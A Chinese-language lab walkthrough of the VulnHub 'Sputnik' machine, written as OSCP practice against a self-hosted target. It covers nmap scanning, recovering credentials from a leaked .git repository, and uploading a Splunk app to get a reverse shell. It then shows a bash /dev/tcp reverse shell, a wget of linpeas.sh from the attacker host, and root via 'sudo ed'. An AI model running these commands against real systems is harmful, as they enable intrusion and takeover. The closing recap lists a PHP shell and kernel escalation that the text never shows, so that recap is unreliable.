本项目是[Sputnik](https://www.vulnhub.com/series/sputnik,204/)作者精心制作的项目环境，目标是获取获得root权限并找到flag.txt文本信息，该项目作为OSCP考试培训必打的一个项目环境，该作者评定该环境为渗透中级水准难度。不管是零基础的学习者，还是从事安全行业的人员，都可以通过这个项目学习到一些技巧或知识。

 **注意：**

本文仅用于技术讨论与研究，对于所有笔记中复现的这些终端或者服务器，都是自行搭建的环境进行渗透的。我将使用Kali
Linux作为此次学习的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，本站及作者概不负责。

![1661189076_6303bbd44a66d1bc17432.png!small?1661189076558](https://image.3001.net/images/20220823/1661189076_6303bbd44a66d1bc17432.png!small?1661189076558)

渗透测试的本质就是信息收集

### 1\. nmap扫描项目ip

本项目环境是nat模式搭建，需要项目的IP地址，首先根据本地IP地址信息，或者虚拟网卡信息，进行扫描挖掘项目IP地址，对本机IP地址进行全网段扫描

`nmap 192.168.27.0/24 -sP`

### 2\. nmap全端口扫描

进行namp全端口服务枚举：

`nmap -p- 192.168.27.130 -A`

![1661189082_6303bbda5ae6bc39a284e.png!small?1661189082746](https://image.3001.net/images/20220823/1661189082_6303bbda5ae6bc39a284e.png!small?1661189082746)

    
    
    8089/tcp open ssl/http Splunkd httpd
    
    | http-robots.txt: 1 disallowed entry
    
    |_/
    
    |_http-server-header: Splunkd
    
    |_http-title: splunkd
    
    | ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
    
    | Not valid before: 2019-03-29T11:03:21
    
    |_Not valid after: 2022-03-28T11:03:21
    
    55555/tcp open http Apache httpd 2.4.29 ((Ubuntu))
    
    | http-git:
    
    | 192.168.27.130:55555/.git/
    
    | Git repository found!
    
    |_ Repository description: Unnamed repository; edit this file 'description' to name the...
    
    |_http-server-header: Apache/2.4.29 (Ubuntu)
    
    |_http-title: Flappy Bird Game
    
    61337/tcp open http Splunkd httpd
    
    | http-robots.txt: 1 disallowed entry
    
    |_/
    
    |_http-server-header: Splunkd

打开了端口 8089、55555 和 61337，端口 55555 具有关联的 IP 地址和 git 存储库的目录链接！

分别访问三个端口。

![1661189089_6303bbe1c9734c06bac86.png!small?1661189090107](https://image.3001.net/images/20220823/1661189089_6303bbe1c9734c06bac86.png!small?1661189090107)

![1661189096_6303bbe828b017fd75d5c.png!small?1661189096443](https://image.3001.net/images/20220823/1661189096_6303bbe828b017fd75d5c.png!small?1661189096443)

![1661189100_6303bbece00330ab7aed7.png!small?1661189101986](https://image.3001.net/images/20220823/1661189100_6303bbece00330ab7aed7.png!small?1661189101986)

发现在端口8089处有个账号密码登录点，

![1661189105_6303bbf1458490a119e62.png!small?1661189105627](https://image.3001.net/images/20220823/1661189105_6303bbf1458490a119e62.png!small?1661189105627)

目前的信息就到此为止了，我们去看看其他的。

### 3\. git库拖库

上面nmap扫描出55555端口有.git文件泄露，

![1661189109_6303bbf52704246663723.png!small?1661189109563](https://image.3001.net/images/20220823/1661189109_6303bbf52704246663723.png!small?1661189109563)

当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当,可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。

在logs目录下的HEAD文件中

0000000000000000000000000000000000000000
21b4eb398bdae0799afbbb528468b5c6f580b975 root <root@sputnik.(none)> 1553864873
+0000 clone: from <https://github.com/ameerpornillos/flappy.git>

![1661189115_6303bbfb415ec491912ce.png!small?1661189115562](https://image.3001.net/images/20220823/1661189115_6303bbfb415ec491912ce.png!small?1661189115562)

访问该github链接，

![1661189121_6303bc01a7fa384889580.png!small?1661189122193](https://image.3001.net/images/20220823/1661189121_6303bc01a7fa384889580.png!small?1661189122193)

Git clone用于克隆文件并将其下载到系统以供进一步查看源码分析：

git clone <https://github.com/ameerpornillos/flappy>

![1661189127_6303bc0710b66a4d51df7.png!small?1661189127441](https://image.3001.net/images/20220823/1661189127_6303bc0710b66a4d51df7.png!small?1661189127441)

`cd flappy`

`ls -la`

查看详细信息，

![1661189131_6303bc0be5ee841ba2c52.png!small?1661189132261](https://image.3001.net/images/20220823/1661189131_6303bc0be5ee841ba2c52.png!small?1661189132261)

`git log`\--克隆了它并浏览历史情况

`git log -p `\---查看每一个源码的详细信息

摁空格向下翻，翻到（END）结束、

![1661189136_6303bc10a4541f5ba8dd1.png!small?1661189137015](https://image.3001.net/images/20220823/1661189136_6303bc10a4541f5ba8dd1.png!small?1661189137015)

发现一个地方

![1661189141_6303bc15d2b7b1b71b19d.png!small?1661189142251](https://image.3001.net/images/20220823/1661189141_6303bc15d2b7b1b71b19d.png!small?1661189142251)

+sputnik:ameer_says_thank_you_and_good_job

发现一个账号密码。

### 4\. Splunkd httpd反弹shell

Splunk：

Splunk 是机器数据的引擎。使用 Splunk 可收集、索引和利用所有应用程序、服务器和设备生成的快速移动型计算机数据 。 使用 Splunking
处理计算机数据，可让您在几分钟内解决问题和调查安全事件。监视您的端对端基础结构，避免服务性能降低或中断。以较低成本满足合规性要求。关联并分析跨越多个系统的复杂事件。获取新层次的运营可见性以及
IT 和业务智能。

![1661189267_6303bc93df1a99528a415.png!small?1661189268150](https://image.3001.net/images/20220823/1661189267_6303bc93df1a99528a415.png!small?1661189268150)

访问：

[http://192.168.27.130:61337](http://192.168.27.130:61337/en-US/account/login?session_expired=1&return_to=%2Fen-US%2Fapp%2Flauncher%2Fhome)

提示：

Splunk管理员为您提供的用户名和密码！

将上面收集到的账号密码尝试输入

sputnik

ameer_says_thank_you_and_good_job

![1661189273_6303bc99db3e449b11803.png!small?1661189274476](https://image.3001.net/images/20220823/1661189273_6303bc99db3e449b11803.png!small?1661189274476)

谷歌搜索：

splunk reverse shell

<https://github.com/TBGSecurity/splunk_shells>

找到了一种使用反向和绑定 shell 来武器化 Splunk 的方法！

通过上次一个xxx.tar.gz文件到机器学习的后台管理去部署，生成一个会话模块引擎，通过会话框去执行命令

* * *

将github上的工具下载下来

`git clone <https://github.com/TBGSecurity/splunk_shells/archive/1.2.tar.gz>`

部署的话，首先下拉栏里面选择第一个，找到Apps

![1661189279_6303bc9fd46f6ac280ec4.png!small?1661189280407](https://image.3001.net/images/20220823/1661189279_6303bc9fd46f6ac280ec4.png!small?1661189280407)

选择这里的install

![1661189283_6303bca39c2996ceebea1.png!small?1661189284073](https://image.3001.net/images/20220823/1661189283_6303bca39c2996ceebea1.png!small?1661189284073)

![1661189287_6303bca7dd7272f41e84f.png!small?1661189288187](https://image.3001.net/images/20220823/1661189287_6303bca7dd7272f41e84f.png!small?1661189288187)

将刚才的文件进行上传

![1661189293_6303bcad314e9cc974a74.png!small?1661189293857](https://image.3001.net/images/20220823/1661189293_6303bcad314e9cc974a74.png!small?1661189293857)

上传成功

![1661189296_6303bcb0e6e39a6a615ca.png!small?1661189297205](https://image.3001.net/images/20220823/1661189296_6303bcb0e6e39a6a615ca.png!small?1661189297205)

点击Restart Now进行重启

![1661189300_6303bcb4e48b645ed7d0b.png!small?1661189301233](https://image.3001.net/images/20220823/1661189300_6303bcb4e48b645ed7d0b.png!small?1661189301233)

重启之后需要重新登录一次

![1661189304_6303bcb89e47f94f052fe.png!small?1661189304877](https://image.3001.net/images/20220823/1661189304_6303bcb89e47f94f052fe.png!small?1661189304877)

可以看到部署成功

点击permissions

![1661189310_6303bcbe9a7f816b0dad6.png!small?1661189310838](https://image.3001.net/images/20220823/1661189310_6303bcbe9a7f816b0dad6.png!small?1661189310838)

选择all apps，并保存

![1661189313_6303bcc1e63a598b03ffa.png!small?1661189314234](https://image.3001.net/images/20220823/1661189313_6303bcc1e63a598b03ffa.png!small?1661189314234)

然后依旧是点击app下拉栏，选择search

![1661189320_6303bcc8e8eb63a6da6a8.png!small?1661189321214](https://image.3001.net/images/20220823/1661189320_6303bcc8e8eb63a6da6a8.png!small?1661189321214)

此时可以在框中执行命令并反弹shell

本地开启：

`nc -vlp 8888`

`| revshell std 192.168.27.195 8888`

![1661189325_6303bccd4bfa1f2523fcb.png!small?1661189325519](https://image.3001.net/images/20220823/1661189325_6303bccd4bfa1f2523fcb.png!small?1661189325519)

![1661189330_6303bcd26c95826b63853.png!small?1661189330801](https://image.3001.net/images/20220823/1661189330_6303bcd26c95826b63853.png!small?1661189330801)

![1661189334_6303bcd669e80a0387ea7.png!small?1661189334640](https://image.3001.net/images/20220823/1661189334_6303bcd669e80a0387ea7.png!small?1661189334640)

看到当前用户id为1001，并且有安装python，所以我们这里获取一下稳定shell

`python -c 'import pty;pty.spawn("/bin/bash")'`

发现执行之后shell断掉了

![1661189366_6303bcf6361cde7b38a59.png!small?1661189366447](https://image.3001.net/images/20220823/1661189366_6303bcf6361cde7b38a59.png!small?1661189366447)

此时可以在反弹shell之后再弹一次shell

`nc -vlp 9999`

`bash -c "bash -i >& /dev/tcp/192.168.27.195/9999 0>&1"`

![1661189370_6303bcfa91a014ca97ba7.png!small?1661189370997](https://image.3001.net/images/20220823/1661189370_6303bcfa91a014ca97ba7.png!small?1661189370997)

### 5\. 信息收集

开始内网信息枚举！

这里使用一个枚举脚本进行信息收集

开启http服务，上传枚举脚本到tmp目录下

`python -m SimpleHTTPServer 8081`

`wget <http://192.168.27.195:8081/linpeas.sh>`

![1661189374_6303bcfe9d92b71449f17.png!small?1661189375067](https://image.3001.net/images/20220823/1661189374_6303bcfe9d92b71449f17.png!small?1661189375067)

赋予脚本权限

`chmod +x linpeas.sh`

然后执行脚本

![1661189379_6303bd0318eb08c22a194.png!small?1661189379446](https://image.3001.net/images/20220823/1661189379_6303bd0318eb08c22a194.png!small?1661189379446)

看到有三个用户，除了root和上面发现的还有一个普通用户，具有sudo权限

![1661189382_6303bd06e7178d61370f2.png!small](https://image.3001.net/images/20220823/1661189382_6303bd06e7178d61370f2.png!small)

输入

`sudo -l`

尝试上面的密码，成功

![1661189388_6303bd0c70eb0a265aad9.png!small?1661189388812](https://image.3001.net/images/20220823/1661189388_6303bd0c70eb0a265aad9.png!small?1661189388812)

### 6\. 提权

提权，顾名思义就是提高自己在服务器中的权限，就比如在windows中你本身登录的用户是guest，然后通过提权后就变成超级管理员，拥有了管理Windows的所有权限。
提权是黑客的专业名词，一般用于网站入侵和系统入侵中。

ed提权

<https://gtfobins.github.io/#ed>

访问网站

![1661189393_6303bd113402a08426963.png!small?1661189393527](https://image.3001.net/images/20220823/1661189393_6303bd113402a08426963.png!small?1661189393527)

查看linux二进制文件怎么提权

点击sudo

![1661189398_6303bd161dfa43e859f28.png!small?1661189398428](https://image.3001.net/images/20220823/1661189398_6303bd161dfa43e859f28.png!small?1661189398428)

`sudo ed `

`!/bin/sh`

![1661189403_6303bd1b17c6382697319.png!small?1661189403488](https://image.3001.net/images/20220823/1661189403_6303bd1b17c6382697319.png!small?1661189403488)

提权成功，

这里项目结束。

通过以上的学习，我们认知了一些红队的小技巧的技术手段，完成了从信息收集到内核提权项目落地，学习到了非常多的技巧，例如nmap全端口信息枚举、.git文件泄露拖库、Splunkd
httpd反弹shell、php反弹shell、一句话get请求、内网信息枚举、sudo提权、等等，希望伙伴们能实际操作复现一遍！来巩固自身的渗透技术和技巧！

最后，希望大家提高安全意识，没有网络安全就没有国家安全！

